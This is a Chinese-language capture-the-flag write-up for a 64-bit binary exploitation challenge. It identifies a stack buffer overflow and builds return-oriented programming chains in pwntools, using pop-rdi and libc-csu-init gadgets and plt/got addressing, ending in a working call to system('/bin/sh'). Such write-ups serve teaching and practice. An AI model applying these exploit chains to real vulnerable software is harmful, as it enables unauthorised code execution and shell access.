## 溢出点
很明显在40068E那个函数里典型rettolibc
```
.text:0000000000400692                 sub     rsp, 40h
.text:0000000000400696                 lea     rax, [rbp+var_40]
.text:000000000040069A                 mov     edx, 10
.text:000000000040069F                 mov     esi, 0C8h
.text:00000000004006A4                 mov     rdi, rax
.text:00000000004006A7                 call    read_bytes
```
这里只有0x40的栈空间，而却是读0xc8的字节
加上ebp, 填充0x40+0x08就能到ret的地址了

## ?????
没有给so库
-脸懵逼。。。可以dl-resolve.
参考了l-ctf官方wp

## Tips
```
*1
def gadget_arg1(func_addr, arg):
    payload = overwrite
    payload += p64(poprdiret_addr)
    payload += p64(arg)
    payload += p64(func_addr)
    payload += p64(vulnfunc_addr)
    return payload
*2
def gadget_call(func_addr, arg1=0, arg2=0, arg3=0, init_ret1=movcall_addr, init_ret2=vulnfunc_addr):
    payload = overwrite
    payload += p64(pop5ret_addr)
    payload += p64(0)   # rbx
    payload += p64(1)   # rbp
    payload += p64(func_addr)
    payload += p64(arg3) + p64(arg2) + p64(arg1)
    payload += p64(init_ret1)    # call 
    payload += '\x00'*(7*0x8)       # pop7
    payload += p64(init_ret2)   # 最后返回到有漏洞的地方下次再次利用
    return payload
```

注意上面这两个函数。
1最后是ret左右func_addr应该是plt段的函数地址，
例如.plt [puts] = 0x400500 
调用的时候是rip先到0x400500(这里的指令对应jmp 0x7???????)然后跳到该函数真正地址
但是如果ret 0x601018(这是got表 里面存的是真正的函数地址的值) 就会执行0x601018这个地址对应的值(转换成code)

2是call func_addr, 所以必须是got的地址
.got[read] = 0x601028
调用的时候是call 0x601028(call的是真正的函数的地址 比如call 0x7ff????????)
但是如果用ret 就会ret到0x601028 rip指向0x601028 明显不是真正func_addr的地址

所以 总结来说就是
ret 后面必须是 .plt
__libc_init 里用call来必须是 .got的

## 主要函数
```
def exp(sys_addr):
    # read(0, rwdata_addr, 0x08) 写入8个字节字符串
    payload = gadget_call(read_got, arg1=0, arg2=rwdata_addr, arg3=0x10)
    payload += 'D'*(200-len(payload))
    p.send(payload)
    log.info('Sending system address and binsh')
    p.send('/bin/sh\x00'+p64(sys_addr))
    p.recvuntil('bye~\n')
    # 检查一下
    leak(rwdata_addr,0x08)
    leak(rwdata_addr+8,0x08)
    # call sys "/bin/sh"
    payload = gadget_call(rwdata_addr+8, arg1=rwdata_addr)
    payload += 'D'*(200-len(payload))
    p.send(payload)
    p.recvuntil('bye~\n')
    p.interactive()
```
这里自己用的pwntools
主要是修改got表。期间出了很多问题。细心是关键。
